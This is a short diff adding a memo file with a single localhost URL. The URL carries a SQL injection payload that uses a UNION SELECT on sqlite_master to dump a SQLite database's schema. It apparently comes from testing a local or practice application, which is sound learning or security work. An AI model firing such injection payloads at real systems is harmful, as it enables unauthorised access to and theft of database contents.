@@ -1,0 +1,2 @@
+#this is just some url(s) memo:
+http://127.0.0.1/sqlite.php?a=%27union+select+1,+sql+from+sqlite_master+;+--
